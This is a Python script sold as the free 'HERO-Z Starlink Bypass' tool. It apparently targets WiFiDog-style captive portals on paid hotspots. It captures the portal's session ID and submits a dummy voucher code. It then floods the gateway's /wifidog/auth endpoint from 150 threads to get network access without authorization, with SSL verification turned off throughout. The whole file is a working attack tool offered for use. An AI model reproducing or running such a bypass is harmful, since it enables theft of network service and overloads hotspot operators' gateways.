import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# --- SSL Error & Warnings Bypass ---
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION (KEY_URL and LICENSE_FILE are now obsolete for free version) ---
# KEY_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/Aladdin/refs/heads/main/key.txt"
# LICENSE_FILE = ".aladdin_v11.lic"

def get_hwid():
    # This function is retained for device identification, though not used for licensing in this free version.
    ID_STORAGE = ".device_id"

    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()

    try:
        # Attempt to get Android serial or ID
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial: # Fallback to UUID if Android IDs fail
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"HERO-Z-{raw_hash}" # Updated prefix
    except:
        # Fallback for non-Android systems or errors
        new_id = f"HERO-Z-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"

    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

def banner():
    os.system('clear')
    print("\033[96m" + " ="*35)
    print("\033[93m" + """
   _    _ ______ _____   ____    ______ 
 | |  | |  ____|  __ \ / __ \  |___  / 
 | |__| | |__  | |__) | |  | |    / /  
 |  __  |  __| |  _  /| |  | |   / /   
 | |  | | |____| | \ \| |__| |  / /__  
 |_|  |_|______|_|  \_\\____/  /_____| 
    """)
          
    print("\033[95m" + "   ✨ HERO-Z Starlink Bypass - FREE IMMORTAL V11 ✨")
    print("\033[96m" + " ="*35 + "\033[0m\n")

# save_license and load_license are no longer needed as the script is free.
# Their logic is removed to simplify and make the script truly free.
def save_license(hwid, key, expiry):
    pass # No longer saves license for the free version

def load_license():
    return None # No longer loads license for the free version

def check_license():
    hwid = get_hwid()
    banner()

    print(f"\033[94m[*] YOUR DEVICE ID: {hwid}\033[0m")
    print("\033[92m[✓] ACCESS GRANTED! Welcome to HERO-Z Starlink Bypass (FREE VERSION)!\033[0m")
    print("\033[95m[*] Enjoy unlimited, unrestricted access.\033[0m")
    time.sleep(2)
    return True # Always grant access as it's the free version

def check_net():
    try:
        # Use a reliable public server to check internet connectivity
        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
    except:
        return False

def high_speed_pulse(link):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
    }
    while True:
        try:
            requests.get(link, timeout=5, verify=False, headers=headers)
            print(f"\033[92m[✓] HERO-Z Bypass | STABLE & FAST >>> [{random.randint(40,180)}ms]\033[0m")
            time.sleep(0.01) # Aggressive pulsing
        except requests.exceptions.RequestException as e:
            # More specific error handling for network issues
            # print(f"\033[91m[!] Pulse Error: {e}. Retrying...\033[0m")
            time.sleep(1) # Wait longer on error before retrying to avoid hammering
            break # Break to allow re-injection if connection is truly lost
        except Exception as e:
            # print(f"\033[91m[!] Unexpected error in high_speed_pulse: {e}. Retrying...\033[0m")
            time.sleep(1)
            break

def start_immortal():
    if not check_license(): # This will always return True now
        return

    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] HERO-Z Force Scanning Portal for Starlink connection...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=7) # Increased timeout
            
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=7)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=7)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            
            if sid:
                print(f"\033[96m[✓] HERO-Z Session ID Captured: {sid[:15]}...\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                
                # Attempt to post with a generic accessCode (might not be strictly necessary, but mimics original logic)
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=7)
                
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                print("\033[95m[*] ⚡ Launching High-Speed Stable Injection Threads ⚡\033[0m")
                # Increased thread count for more aggressive injection
                for _ in range(150): # Increased from 120
                    threading.Thread(target=high_speed_pulse, args=(auth_link,), daemon=True).start()
                
                print("\033[92m[✓] HERO-Z Bypass Activated! Monitoring connection...\033[0m")
                while True:
                    if not check_net():
                        print("\033[91m[!] Connection Lost! Re-injecting with HERO-Z power...\033[0m")
                        break # Break to restart the main loop and re-scan/re-inject
                    time.sleep(5) # Check network every 5 seconds
            else:
                print("\033[91m[!] Failed to capture Session ID. Retrying portal scan...\033[0m")
                time.sleep(3) # Wait longer before retrying if SID capture fails
        except requests.exceptions.RequestException as e:
            print(f"\033[91m[!] Network Error during portal scan: {e}. Retrying...\033[0m")
            time.sleep(3)
        except Exception as e:
            print(f"\033[91m[!] An unexpected error occurred: {e}. Retrying...\033[0m")
            time.sleep(3)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print("\n\033[91m[!] HERO-Z Bypass Stopped by User. Goodbye!\033[0m")
    except Exception as e:
        print(f"\033[91m[CRITICAL ERROR] HERO-Z encountered an unhandled exception: {e}\033[0m")
